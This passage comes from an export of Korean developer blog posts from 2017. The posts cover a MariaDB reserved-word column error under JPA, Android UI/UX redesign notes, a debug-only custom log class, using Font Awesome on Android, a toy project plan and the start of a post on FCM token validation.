.setUserGroup(\"관리자\")\n                        .setUpdateDate(LocalDateTime.now())\n        );\n```\n\n이 구문을 수행할 때 에러가 발생하였습니다.\n\n에러 구문은 다음과 같습니다.\n\n```\n2017-11-27 14:25:08 ERROR :[SqlExceptionHelper.java]logExceptions(129) :\n(conn:33312) You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version\nfor the right syntax to use near\n'group, id, phone, pw, type, update_date) values ('2017-11-27 14:25:08.67', 'admi' at line 1\n\nQuery is: insert into account (create_date, email, group, id, phone, pw, type, update_date) values (?, ?, ?, ?, ?, ?, ?, ?),\nparameters ['2017-11-27 14:25:08.67','admin@admin.com','관리자','admin','000-000-0000','c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a'\n,'admin','2017-11-27 14:25:08.67']\n```\n\n에러에서는 **'admi' at line 1** 이 부분의 문제로 보고 제가 쿼리를 주는 **Entitiy** 부분의 문제인지도 확인하였지만 아니었습니다.\n\n당췌 어디가 문제인지를 찾다가 하이버네이트의 SQL 로그를 자세히 확인해보기로 하였습니다.\n\n그리고 원인을 찾게 된 것은 다음과 같았습니다...\n\n데이터베이스에 테이블을 지우고, JPA에서 직접 테이블을 생성을 해보는 것을 시도하던 도중\n\n> **group` varchar(60) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT ''**\n\n특수 이름을 사용한 경우에 발생하는 문제였던 것이었습니다....\n\n[Stackoverflow](https://stackoverflow.com/questions/2224503/creating-field-with-reserved-word-name-with-jpa)에서 찾은 내용입니다.\n\n<br>\n\n## 처참한 결과...\n\n결국 테이블의 컬럼명을 바꿈으로써 문제를 해결하였습니다.\n\n혹시 주니어 개발자 또는 초급 개발자의 경우 혹시 이런 문제가 발생한 경우 이것을 보고 도움이 되셨으면 합니다...\n\n저처럼 시간을 많이 허비하지 않았으면 합니다...\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-26) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 해당 글은 11월 초중순 쯤 초안이 작성되었고, 해당 글을 정리하여 포스팅한 내용입니다.  UI와 UX의 고민 사용자와 관련된 모바일 어플리케이션 또는 웹 페이지를 개발할 때 우리는 고민을 하게 됩니다. 물…","fields":{"slug":"/til/171126-devnote/"},"frontmatter":{"date":"November 26, 2017","title":"연구일지 - Android 앱 UI 및 UX 개선 작업 (QGMobile)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-26) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n> 해당 글은 11월 초중순 쯤 초안이 작성되었고, 해당 글을 정리하여 포스팅한 내용입니다.\n\n![thumbnail](../thumbnail_til.png)\n\n# UI와 UX의 고민\n\n사용자와 관련된 모바일 어플리케이션 또는 웹 페이지를 개발할 때 우리는 고민을 하게 됩니다.\n\n물론 큰 규모의 회사인 경우 UX를 전담으로 하는 팀이 있고, UI를 작업하는 디자이너가 있습니다.\n\n하지만 작은 규모의 회사는 이런 인력을 충원하기 매우 어렵습니다.\n\n일반적으로 제가 만나본 개발자들의 경우 디자인에 대한 고려를 전혀 하지 않았습니다.\n\n또한 기능만 동작하면 되지, UX와 UI는 크게 신경을 쓸 필요가 없는 부분이라 생각을 합니다.\n\n(제 개인적인 경험과 인맥에 제한된 것입니다. **절대 대다수 개발자**를 이야기하는게 아닙니다.)\n\n개인적으로 이렇게 생각하는 것은 몹시 안 좋은 습관이라 생각합니다.\n\n모바일 어플리케이션과 웹 서비스의 경우 기계가 사용하는 것이 아닌 사람이 사용을 하기 때문이죠.\n\n사람이 사용하기 좋게 만드는 것도 개발자가 생각해야 할 필수 고려 옵션이라 생각합니다.\n\n일단 서론은 여기까지고...\n\n제가 재직 중인 작은 회사에서 개발을 하며 고민했던 UX 관련 작업 경험을 공유해보고자 합니다.\n\n> 물론 저도 전문적인 UI & UX 개발자는 아니지만, 순수하게 제가 고민하고 경험했던 부분을 기록하는 포스팅임을 감안해 주시길..\n\n<br>\n\n## 끔찍한 화면 구성, 그리고 개선\n\n일단 제가 개발한 앱에 대한 간략한 설명을 하자면...\n\n서버에서 Rest api를 호출한 결과 값을 화면에 보여주는 안드로이드 어플리케이션입니다.\n\n먼저 초창기는 아니지만... 1차 버전의 메인 리스트를 보도록 하죠.\n\n|       1차       |       2차       |\n| :-------------: | :-------------: |\n| ![](/img01.png) | ![](/img02.png) |\n\n**1차** 화면을 보면..\n\nRecyclerView를 통해 데이터를 보여주는데 일단 Cell(리사이클뷰의 아이템)의 UX는 잠시 접어두고...\n\n상단이 너무 조잡하다는 것을 느낄 수 있습니다.\n\n화면 상단의 네비게이션이라 할 수 있는 부분은 좌측 메뉴 옵션, 중간 타이틀, 우측 리프래시 버튼으로 구성이 되어 있고,  \n바 하단엔 뷰의 라벨 그리고 우측엔 리프래시 이후 경과시간을 보여주고 있습니다.\n\n(설명까지 이렇게 복잡하다는 것은 확실히 문제가 있다고 할 수 있죠.)\n\n게다가 구역 선택의 화면은 너무 동떨어진 느낌을 지울 수 없습니다.\n\n약간의 개선을 통해 **2차** 화면이 만들어졌습니다.\n\n하지만 색상과 네비게이션 바 타이틀, 그리고 좌측 메뉴가 뒤로가기로 변경된 부분 빼고는 크게 다른 점은 없네요?\n\n**1차**버전에서는 사실 앱이 진입하고 나서 바로 저 화면으로 보여주면서 메뉴를 좌측 상단에 배치하는 구조였습니다.\n\n하지만 이렇게 할 경우 사용자 입장에서는 **메뉴**라는 기능과 **기계 현황**이라는 항목이 같이 겹쳐 있어서 혼동이 올 수 있는 구조입니다.\n\n또한 상단의 메뉴 중 **리프래시 버튼** 구조가 있는 것이 딱히 맘에 들지 않습니다.\n\n최근 모바일 어플리케이션의 UX방법 중에는 저런 TableView(iOS) 또는 ListView & RecyclerView(Android) 뷰 컴포넌트를 상단에서 당겨서,\n뷰 데이터를 갱신하는 구조를 많이 사용합니다.\n\n그래서 최종적으로는 메뉴와 메인화면, 그리고 기계리스트 두 가지 화면으로 나눠서 구성하였습니다.\n\n|    메인화면     |      메뉴       | 개선된 기계 현황 |\n| :-------------: | :-------------: | :--------------: |\n| ![](/img03.png) | ![](/img04.png) | ![](/img06.png)  |\n\n메인화면에서는 데이터를 나눠서 대시보드 스타일로 맞춰서 구현을 하였고, 메뉴 또한 리스트나 다른 메뉴에서의 접근이 아닌,\n메인급 화면에서만 접근이 가능하도록 변경하였습니다.\n\n그리고 개선된 기계 현황의 경우 리프래시를 Pull-down 스타일로 변경하고, 기계 리스트에서 보여주는 데이터의 정렬 부분을 추가함으로써,\n데이터 표현에 대한 방법을 개선하였습니다.\n\n이것은 여담이지만... 저 정렬을 스트림과 필터로 구현하려 하였지만...\n안드로이드가 Java8을 완벽하게 지원하는 것이 아니기 때문에 일일히 나눠서 구현하게 되었습니다. (제발 Java8이 안드로이드에서도 완벽하게 지원되길...)\n\n<br>\n마지막으로는 저 기계 리스트에서 아이템을 선택했을 때 자세한 기계 정보 화면을 보여주는 부분을 개선한 것을 보도록 하죠.\n\n|    구형 버전    |    개선 버전    |    개선 버전    |\n| :-------------: | :-------------: | :-------------: |\n| ![](/img07.png) | ![](/img08.png) | ![](/img09.png) |\n\n구형 버전을 보면...\n\n정말 답이 없습니다....\n\n비 개발자분에게 시연하였을 때도 데이터가 명확하게 보이지 않을 뿐더러 화면이 뭔가 조잡하게 느껴진다는 반응이었습니다.\n\n화면 상단의 버튼식으로 움직이는 부분 또한 문제가 되었습니다.\n\n그래서 이 부분은 Android의 ViewPager와 [SmartTab](https://github.com/ogaclejapan/SmartTabLayout)이라는 오픈소스를 활용하여 개선하였습니다.\n\n또한 안의 데이터를 조각으로 나누고 Bootstrap 스타일로 화면을 구성하였습니다.\n\n사실 다른 UI 방법이 있었겠지만, 디자이너가 없는 관계로 제 선에서는 저 방법이 최선이었습니다.(사실 지금 다른 아이디어도 떠오르긴 하네요.)\n\n<br>\n\n## 결론...UX 그리고 UI\n\n일개 개발자인 제가 UX 그리고 UI를 한꺼번에 작업하긴 어려웠지만, 그래도 어느정도 깔끔하게(?) 데이터를 표현하는 방법까지는 도달할 수 있었습니다.\n\n제일 중요한 것은 **노력**이라 생각합니다.\n\n사실 값을 보여주는 것 자체에 집중을 한다면 결과물을 뽑아내는 것에는 아무런 문제가 되지 않을 것입니다. (개발자 입장에서는)\n\n하지만 그 값을 어떻게 보여주고, 표현하는지가 그 결과물의 진수를 담는 것이라 생각이 듭니다.\n\n저는 개발을 할 때 항상 최선을 다한다.\n\n물론 알바 또는 프리랜서로 작업하는 결과물의 경우에는 가이드를 따라야 하기에 제약이 있지만..\n\n제가 토이 프로젝트로 진행하는 경우에는 정말 다양한 것을 고려하고, 개발을 합니다..\n\n**항상 모든 작업은 장인정신을 가지고 만들어가자** 라는 것이 제 개인 철학입니다.\n\n이 철학을 잊지 말고, 오늘도 저의 결과물을 어떻게 더 개선할 지 좀 더 고민을 해봐야겠습니다..\n\n> 잘 설계된 UX는 메뉴얼이 필요없고, 깔끔하고 심플하게 디자인된 UI는 사용자에게 편리함을 이끌어낸다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-25) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  개발일지(는 아니고 근황?) 무엇을 했길래 글 리스폰 상태가? 기술 블로그에 괜찮은 내용으로 포스팅을 많이 올리고 싶지만... 어제(24일)까지 프로젝트를 마무리 짓느라 제대로 글을 올릴 수 없었습니다. …","fields":{"slug":"/til/171125_devnote01/"},"frontmatter":{"date":"November 25, 2017","title":"11월 25일 개발일지 (근황 및 정리)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-25) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n# 개발일지(는 아니고 근황?)\n\n## 무엇을 했길래 글 리스폰 상태가?\n\n기술 블로그에 괜찮은 내용으로 포스팅을 많이 올리고 싶지만...\n\n어제(24일)까지 프로젝트를 마무리 짓느라 제대로 글을 올릴 수 없었습니다.\n\n서버와 안드로이드간의 개발을 모두 마무리 짓고, 어제 **플레이스토어**에 정상적으로 등록까지 마쳤습니다.\n\n지금 재직 중인 회사는 서비스를 개발하는 회사는 아니고, 제조쪽 기계와 연관된 서비스(는 아니고 어플리케이션?)를(을) 개발하는 회사입니다.\n\n<del>사실 서비스 개발을 중심으로 하는 회사를 가고 싶었지만, 개발자로써의 자질을 좀 더 키운 후 이직하는 것을 목표로...</del>\n\n어제까지 개발을 마무리하고 문서화를 하느라 포스팅을 제대로 못하였지만,  \n이제 프로젝트가 마무리 되어서 진행하며 배우거나 찾은 것을 위주로 포스팅을 진행할 예정입니다.\n\n<br>\n\n## 주요 포스팅 예정\n\n일단 포스팅 예정인 주제는 아래와 같습니다.\n\n- Android - Retrofit 통신 관련 - 앱 UX 개선 작업 - 개발하며 찾은 라이브러리 및 개발 방법\n\n- Server Side (Spring boot) - Fcm 토큰 설계 - Jwt 관련\n\n<br>\n\n해당 포스팅을 검색하시려면 **Tag**기능을 활용하시면 금방 검색이 가능하고, 관련 내용 업데이트를 진행할 예정입니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-25) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 안드로이드 로그 안드로이드 개발자라면 개발에서 결과 또는 테스트를 위해 로그 기능을 사용할 것입니다. 하지만 이 로그는 배포버전이 아닌 개발버전에서만 나오게끔 하는 것이 제일 베스트한 선택일 것입니다. 또한…","fields":{"slug":"/android/171125_android_log/"},"frontmatter":{"date":"November 25, 2017","title":"안드로이드 개발 시 커스텀 로그 남기기","description":"커스텀 로그 남기는 방법","tags":["Android"],"series":"Android","previewImage":"android_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-25) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n# 안드로이드 로그\n\n안드로이드 개발자라면 개발에서 결과 또는 테스트를 위해 로그 기능을 사용할 것입니다.\n\n하지만 이 로그는 배포버전이 아닌 개발버전에서만 나오게끔 하는 것이 제일 베스트한 선택일 것입니다.\n\n또한 기본적으로 사용하는 로그의 경우 아래와 같이 사용하게 됩니다.\n\n```java\nLog.d(\"Log tag\", \"Log message...\");\n```\n\nLog 클래스 뒤에 메서드는 로그 레벨로써 아래와 같이 분류됩니다.\n\n<br>\n\n| 로그 레벨  |                        설명                         | 우선순위  |\n| :--------: | :-------------------------------------------------: | :-------: |\n|  e(Error)  |                 오류가 났을 때 사용                 | 매우 높음 |\n|  w(Warn)   | 오류는 아니지만 문제가 발생할 가능성이 있을 때 사용 |   높음    |\n|  i(Info)   |                   일반적으로 사용                   |   중간    |\n|  d(Debug)  |           개발 중 확인이 필요할 경우 사용           |   낮음    |\n| v(Verbose) |           자세한 정보 등을 표시할 때 사용           | 매우 낮음 |\n\n> 로그에 대해 좀 더 상세한 설명은 [공식문서](https://developer.android.com/studio/debug/am-logcat.html)를 참고하시길\n\n<br>\n\n이제 기본적인 내용은 여기까지하고, 포스트에서 원하는 목표는 다음과 같습니다.\n\n**1. 개발버전에서만 동작하는 기능 만들기**  \n**2. 나만의 로그 만들기**\n\n그럼 하나씩 풀어나가보도록 하겠습니다.\n\n<br>\n\n## 1. 개발버전에서만 동작하는 기능 만들기\n\n먼저 현재 어플리케이션이 구동되는 상태가 개발버전인지 아니면 배포버전인지 알아야 합니다.\n\n저의 경우 아래와 같이 전역 메서드를 하나 생성하고, 호출하는 방식으로 구현하였습니다.\n\n```java\npublic class SomeCls {\n\n\t/**\n     * 현재 디버그 상태(개발모드) 체크를 하는 메서드\n     * @param context\n     * @return true-개발모드 / false-릴리즈 모드\n     */\n    public static boolean isDebuggable(Context context) {\n        boolean debuggable = false;\n        PackageManager pm = context.getPackageManager();\n        try{\n            ApplicationInfo appinfo = pm.getApplicationInfo(context.getPackageName(), 0);\n            debuggable = (0 != (appinfo.flags & ApplicationInfo.FLAG_DEBUGGABLE));\n        }catch (PackageManager.NameNotFoundException e) {\n            Log.d(\"MyLog\", makeClazzAndMethodName(context.getClass(), \"isDebuggable\") + \" error msg = \" + e.getMessage());\n        }\n        return debuggable;\n    }\n\n}\n```\n\n위 메서드를 호출할 경우 boolean을 반환하는데 true일 경우 개발모드(Debug), false일 경우 배포모드입니다.\n\n일단 개발버전을 체크하는 메서드는 준비되었습니다.\n\n그럼 다음과 같이 로그를 개발버전에서만 보이게끔 처리할 수 있을 것입니다.\n\n```java\n\tif(SomeCls.isDebuggable(context)) {\n\t\tLog.d(\"DEV-LOG\", \"Hello~ World Log\");\n\t}\n```\n\n그런데 매번 이렇게 로그를 작성하려면 뭔가 번거롭습니다.\n\n특히 저 **if(SomeCls.isDebuggable(context))** 이 부분이 몹시 거슬립니다.\n\n또한 Context 객체를 계속 전달을 받아야 하는 부분도 번거롭네요.\n\n이것을 해결하기 위해선 다양한 방법이 있습니다.\n\n1. 어플리케이션에서 제일 먼저 진입하는 Activity에서 전역(정적) 변수를 선언하고, 이 전역(정적) 변수를 통해서 체크하는 방법.\n2. 전역에서 사용할 클래스를 하나 생성 후, 전역 변수를 하나 만들고,\n   어플리케이션에서 제일 먼저 진입하는 Activity에서 앞서 설명한 전역 변수에 값을 저장 후 체크하는 방법.\n\n말로 쓰면 어려우니 간단한 코드로 설명을 대신합니다.\n\n```java\n///제일 처음 진입하는 Activity == MainActivity\n///전역 클래스 == CommUtil   전역 변수 == boolean ISDEBUG\n\n///Type 1 (MainActivity 안)\n\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n\tsuper.onCreate(savedInstanceState);\n\tISDEBUG = isDebuggable(getApplicationContext());\n}\n\n\n///Type 2 (MainActivity 안)\n\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n\tsuper.onCreate(savedInstanceState);\n\tCommUtil.ISDEBUG = isDebuggable(getApplicationContext());\n}\n\n```\n\n이제 개발버전에서만 동작하는 기능을 구현하였습니다.\n\n하지만 로그를 작성할 때마다 if문을 계속 같이 쓰면 번거롭습니다.\n\n또한 항상 로그 태그와 함께 메세지를 넣는 부분도 거슬립니다. (물론 경우에 따라서 로그 태그를 통해 분기하기도 하지만...)\n\n그렇다면 나만의 로그 클래스를 만들고 그 안에서 위 작업을 한꺼번에 처리한다면?\n\n<br>\n\n## 2. 나만의 로그 만들기\n\n이제 나만의 로그 클래스를 만들어 보도록 하겠습니다.\n\n프로젝트에서 적당한 로그 클래스를 만들어봅니다.\n\n먼저 코드를 참고하기길..\n\n```java\npublic class MyLog {\n\tprivate static final String TAG = \"MyAppLog\";\n\n\tpublic static final void i(String msg) { if (ISDEBUG) { Log.i(TAG, makeLogBody(msg)); } }\n\tpublic static final void v(String msg) { if (ISDEBUG) { Log.v(TAG, makeLogBody(msg)); } }\n\tpublic static final void w(String msg) { if (ISDEBUG) { Log.w(TAG, makeLogBody(msg)); } }\n\tpublic static final void d(String msg) { if (ISDEBUG) { Log.d(TAG, makeLogBody(msg)); } }\n\tpublic static final void e(String msg) { if (ISDEBUG) { Log.e(TAG, makeLogBody(msg)); } }\n\n\t/**\n     * 로그에 띄울 메세지를 만들어주는 메서드\n     * @param logMsg\n     * @return\n     */\n    private static String makeLogBody(String logMsg) {\n        StackTraceElement ste = Thread.currentThread().getStackTrace()[4];\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        sb.append(ste.getFileName().replace(\".java\", \"\"));\n        sb.append(\"::\");\n        sb.append(ste.getMethodName());\n        sb.append(\"] \");\n        sb.append(logMsg);\n        return sb.toString();\n    }\n}\n```\n\n일단 사용방법은 **MyLog.** 으로 사용하면 됩니다.\n\n내부에서 사용된 **ISDEBUG**의 경우 위에서 설명한 방법을 참고합니다.\n\n**makeLogBody** 메서드의 경우 로그의 보여줄 메세지를 만들어주는 메서드로써 보여주고 싶은 내용은 개발자의 입맛에 맞게끔 바꾸면 됩니다.\n\n<br>\n\n# 결론\n\n자신의 입맛에 맞는 커스텀 로그를 만드는 방법을 간단히 알아보았습니다.\n\n오픈소스에서도 다양한 안드로이드용 로그 라이브러리가 있습니다.\n\n전에 찾아본 것으론 **[Logger](https://github.com/orhanobut/logger)** 라는 것도 있었습니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-15) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 안드로이드에서 Font Awesome을? 웹 개발을 할 때 아이콘 같은 것을 표시하기 위해서 Font Awesome을 많이 사용했습니다. 이것을 안드로이드에서도 사용할 수 있는데 어떻게 쓰는지 알아보도록 하…","fields":{"slug":"/android/171115_android_fontawsome_use/"},"frontmatter":{"date":"November 15, 2017","title":"Android에서 Font Awesome 사용하기","description":"Fone Awesome 사용하기","tags":["Font Awesome","Android"],"series":"Android","previewImage":"android_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-15) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# 안드로이드에서 Font Awesome을?\n\n웹 개발을 할 때 아이콘 같은 것을 표시하기 위해서 **Font Awesome**을 많이 사용했습니다.\n\n이것을 안드로이드에서도 사용할 수 있는데 어떻게 쓰는지 알아보도록 하겠습니다.\n\n<br>\n\n## Ready?\n\n실습 환경은 다음과 같습니다.\n\n- OS : Mac OS Sierra\n- Android Studio 2.3.3\n\n일단 안드로이드 프로젝트 생성 및 기타 설정은 생략하도록 하겠습니다.\n\n기존의 프로젝트 또는 예제를 하나 생성하여 시작한다는 가정하에 진행하도록 하겠습니다.\n\n**또한 Text View에 아이콘을 올려보는 것을 목표로 합니다.**\n\n<br>\n\n## How to use?\n\n{% asset_img img01.png fontawesome %}\n\nFont Awesome의 아이콘 중 Bell(위 이미지)을 구현해보는 것을 목표로 하겠습니다.\n\n1. [**Font Awesome**](http://fontawesome.io) 사이트에서 다운로드 후 압축을 풀고 **fonts**라는 디렉토리에서 **fontawesome-webfont.ttf** 파일을 확인합니다.\n2. Font Awesome 사이트에서 Bell을 확인할 때 아래 사진에서 **Unicode** 부분의 값을 확인해두도록 합니다. (여기선 f0c9)\n\n   {% asset_img img02.png fontawesome %}\n\n3. 스튜디오 프로젝트에 **assets** 디렉토리에 **fontawesome-webfont.ttf**파일을 추가해줍니다.\n4. res 디렉토리에서 **strings.xml**에 값을 추가해줍니다..\n   예제 : `<string name=\"fa_bell\">&#xf0c9;</string>`\n   유니코드 앞에 **&#x**를 붙이고, 끝에는 세미콜론(;)을 붙여줍니다.\n5. 그 후 XML에서 TextView를 추가하고 속성에 `android:text=\"@string/fa_bell\"`을 추가해줍니다.\n6. 구현할 Activity에서 **Typeface**를 추가해주도록 합니다.\n   예제 : `Typeface fontAwsome = Typeface.createFromAsset(getAssets(), \"fontawesome-webfont.ttf\");`\n   **Typeface.createFromAsset**의 두 번째 인자는 **1번**에서 추가한 파일명을 넣어줍니다.\n7. 구현할 Activity에서 5번의 TextView의 속성에 setTypeface() 속성을 추가해줍니다.\n   예제 : `someTv.setTypeface(fontAwsome);`\n\n위와 같은 과정을 마치고 앱을 구동해보면 정상적으로 나올 것입니다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-15) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  오늘의 삽질 요 몇일 회사업무 +개인 일정으로 인해 바빠서 포스팅을 제대로 못했네요. 사실 바쁘다는것은 핑계인듯 하고...깊게 반성하는 부분입니다... 그래서 오늘의 연구일지는? (사실 이 글은 어제 퇴근…","fields":{"slug":"/til/171115_devnote/"},"frontmatter":{"date":"November 15, 2017","title":"11월 14일 개발일지(그냥 일지)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-15) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n# 오늘의 삽질\n\n요 몇일 회사업무 +개인 일정으로 인해 바빠서 포스팅을 제대로 못했네요.\n\n사실 바쁘다는것은 핑계인듯 하고...<del>깊게 반성하는 부분입니다...</del>\n\n그래서 오늘의 연구일지는? (사실 이 글은 어제 퇴근하며 작성한 일지입니다.)\n\n<br>\n\n## 오늘도 안드로이드와 혈투(?)\n\n지금 만들어 가는 것은 서버에 Rest api를 호출하여 가지고 온 값을 앱에서 보여주는 작은 서비스(?)를 개발하고 있습니다.\n\n오늘의 삽질은 안드로이드 영역입니다.\n\n안드로이드 영역에서 그래프를 구현해야 하는데 잘 구현되어 있는 것을 찾아보다가\n를 알게 되어 구현을 하였습니다..\n\n[**MPAndroidChart**](https://github.com/PhilJay/MPAndroidChart)\n\n이 그래프 라이브러리를 쓰다 보니 정말 잘 구현되어 있었습니다.\n\n문제는 웹에서는 D3 라이브러리를 써서 쉽게 구현 하였지만,  \n저 라이브러리에서 데이터 표시를 동일하게 하는 것은 어려웠습니다.\n\n사실 그래프 그리는 것은 그대로이지만, 표현을 하는 방식을 동일하게 하는 것은 어려웠습니다.\n\n일단 보여지는 데이터는 어느정도 맞춰서 타협을 하였지만, 기회가 된다면 간단한 bar 그래프를 그리는 라이브러리를 하나 만들어보고 싶다는 생각이 들었습니다.\n\n라고 하지만 저는 웹 백엔드 영역을 좀 깊게 파보고 싶을 뿐이고...\n\n<br>\n\n> ps : 출퇴근 1시간 30분은 너무 고통스럽네요..\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-12) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Toy Project? 음... 사실 개발자라면 쉬는 날에 다른 일도 할 수 있겠지만, 본인의 역량 강화 또는 무언가 필요에 의해 본업 개발 외에 다른 개발 프로젝트를 시작하기도 합니다. 이런걸 Toy P…","fields":{"slug":"/til/171112_devnote/"},"frontmatter":{"date":"November 12, 2017","title":"11월 12일 개발일지(Toy Project 시작)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-12) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n<br>\n\n# Toy Project?\n\n음...\n\n사실 개발자라면 쉬는 날에 다른 일도 할 수 있겠지만,  \n본인의 역량 강화 또는 무언가 필요에 의해 본업 개발 외에 다른 개발 프로젝트를 시작하기도 합니다.\n\n이런걸 **Toy Project**라고도 표현을 하는데,  \n이번에 나도 본격적으로 진행하려 기획을 하고 설계 및 개발을 진행하기로 하였습니다.  \n(사실 해보고 싶은게 넘 많은게 문제지만...)\n\n<br>\n\n## 주제\n\n일단 **Toy Project**를 진행하게 된 계기는 매우 간단했습니다.\n\n지금 제가 일하는 곳은 아주 작은 규모의 스타트업으로써, 아직 회사의 전반적인 프로세스나 시스템을 갖추는 중입니다.\n\n그런데 회사 특성 상 소프트웨어와 하드웨어(제조관련)가 맞물려 있어서, 소프트웨어적인 업무 프로세스를 갖추지 못하였습니다.\n\n그 중 하나가 **사내정보시스템**입니다.\n\n사내 공지사항이나 근태, 급여내역 등을 아직 오프라인 또는 구두로 진행을 하여 많이 불편하습니다.\n\n대기업에 있다가 아주 작은 시작 단계의 회사로 내려와보니 필요한 체제나 시스템이 많이 보였습니다.  \n(여담이지만, 삼성전자에서 소프트웨어적으론 배울게 단 1도 없었지만...이런 **근무체제나 회사 프로세스**는 많이 배운것 같네요 ^^;)\n\n그래서 이번에 오픈소스 프로젝트로 **사내정보시스템**을 만들어보기로 하였습니다.\n\n<br>\n\n## Company Board\n\n이번 프로젝트 이름은 뭐로 작명을 할까? 라는 쓰잘머리 없는 고민을 하다가..\n\n![](/img01.png)\n\n그냥 '회사 게시판? 음..' 이라고 하여 **Company Board**로 만들었습니다.  \n<del>진짜 작명때문에 고통받지요...작명이 뭐길래..</del>\n\n일단 Front-end 부분은 Bootstrap과 제가 제일 좋아하는 [AdminLTE](http://adminlte.io/) 를 사용하여 만들기로 했고,  \nBack-end는 Spring Boot와 JPA, JWT 및 기타 등등등 을 조합하여 개발하기로 하였습니다..\n\n일단은 웹 전용으로 만들어보고, 향후 오픈 후 Rest api를 이용한 모바일 앱으로까지 지원하는 것을 목표로 하였습니다.\n\n작심삼일, 용두사미가 되면 안되기에...\n\n빠르게 목표를 정하고 GTD 기반으로 개발을 진행하여 프로젝트를 완성시켜봐야 겠습니다.\n\n일단 초창기는 내부 버전관리를 이용하고, 어느정도 완성이 되면 Github에 오픈소스화 시켜볼 예정입니다..\n\n마무리로 진행하는 화면을 올리고...오늘의 개발일지 끄읏~\n\n<br>\n\n![](/img02.png)\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2017-11-08) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  오늘의 주제 근무하는 회사에서 Android 앱 개발과 앱에서 사용하는 데이터를 위해 서버에서 Rest api 부분을 개발하였습니다. 또한 알림 부분도 구현을 해야 해서 FCM을 사용하였습니다. 근데 An…","fields":{"slug":"/til/171108_devnote/"},"frontmatter":{"date":"November 08, 2017","title":"11월 7일 연구일지(FCM, Spring Boot환경에서 Http 통신)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2017-11-08) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_til.png)\n\n<br>\n\n# 오늘의 주제\n\n근무하는 회사에서 Android 앱 개발과 앱에서 사용하는 데이터를 위해 서버에서 Rest api 부분을 개발하였습니다.\n\n또한 알림 부분도 구현을 해야 해서 FCM을 사용하였습니다.\n\n근데 Android에서 FCM을 사용하면 토큰을 생성하여 서버에 전달을 하게 되는데,  \n이 토큰이 갱신이 되거나 새로운 기기에서 설치 시 토큰의 유효성을 검사해야 했었습니다.\n\n모두 공개하기는 힘들지만 서버에 클라이언트의 FCM토큰을 받아서 저장을 하는데,  \n만약 유효하지 않은 토큰까지 계속 저장할 경우 향후에 문제가 될 것 같았습니다.\n\n그래서 FCM 토큰의 유효성을 체크하는 것을 알아봤고, 두 가지 주제에 대해 포스팅해보고자 합니다.\n\n**1. FCM 토큰 유효성 검사**  \n**2. Spring에서 Http Request**\n\n그리고 주제를 통해 달성할 최종 목표는 **스케쥴러를 활용하여 일정시간이 되면 미사용 토큰 제거**입니다.\n\n<br>\n\n## FCM 토큰 유효성 검사\n\n토큰 유효성은 [이곳](https://developers.google.com/instance-id/reference/server?hl=ko#manage_relationship_maps_for_multiple_app_instances)에서 